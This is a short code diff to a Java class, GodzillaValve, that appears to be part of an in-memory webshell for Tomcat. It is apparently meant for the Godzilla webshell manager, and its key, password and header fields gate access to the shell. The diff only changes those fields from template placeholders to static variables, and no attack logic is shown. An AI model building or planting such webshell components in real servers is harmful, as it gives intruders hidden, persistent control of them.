@@ -15,11 +15,11 @@ import java.io.IOException;
  * @author ReaJason
  */
 public class GodzillaValve extends ClassLoader implements Valve {
-    public String key = "{{key}}";
-    public String pass = "{{pass}}";
-    public String md5 = "{{md5}}";
-    public String headerName = "{{headerName}}";
-    public String headerValue = "{{headerValue}}";
+    public static String key;
+    public static String pass;
+    public static String md5;
+    public static String headerName;
+    public static String headerValue;
     protected Valve next;
     protected boolean asyncSupported;
 
